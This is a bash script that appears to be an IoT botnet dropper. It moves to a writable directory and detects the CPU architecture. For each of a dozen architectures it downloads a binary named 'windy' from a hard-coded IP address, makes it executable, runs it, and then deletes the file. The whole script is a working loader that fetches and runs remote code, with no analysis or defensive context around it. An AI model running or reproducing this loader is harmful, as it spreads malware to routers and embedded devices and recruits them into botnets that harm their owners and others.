#!/bin/bash

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

ARCH=$(uname -m)

case "$ARCH" in
    mips)
        wget http://152.42.212.230/windy.mips -O windy; chmod +x windy; ./windy
        ;;
    mipsel)
        wget http://152.42.212.230/windy.mipsel -O windy; chmod +x windy; ./windy
        ;;
    armv4l)
        wget http://152.42.212.230/windy.arm4 -O windy; chmod +x windy; ./windy
        ;;
    armv5l)
        wget http://152.42.212.230/windy.arm5 -O windy; chmod +x windy; ./windy
        ;;
    armv6l)
        wget http://152.42.212.230/windy.arm6 -O windy; chmod +x windy; ./windy
        ;;
    armv7l)
        wget http://152.42.212.230/windy.arm7 -O windy; chmod +x windy; ./windy
        ;;
    i586|i686)
        wget http://152.42.212.230/windy.i686 -O windy; chmod +x windy; ./windy
        ;;
    x86_64)
        wget http://152.42.212.230/windy.x86 -O windy; chmod +x windy; ./windy
        ;;
    m68k)
        wget http://152.42.212.230/windy.m68 -O windy; chmod +x windy; ./windy
        ;;
    ppc)
        wget http://152.42.212.230/windy.ppc -O windy; chmod +x windy; ./windy
        ;;
    sh4)
        wget http://152.42.212.230/windy.sh4 -O windy; chmod +x windy; ./windy
        ;;
    sparc)
        wget http://152.42.212.230/windy.sparc -O windy; chmod +x windy; ./windy
        ;;
    *)
        echo "Unknown architecture: $ARCH"
        ;;
esac

rm -rf windy
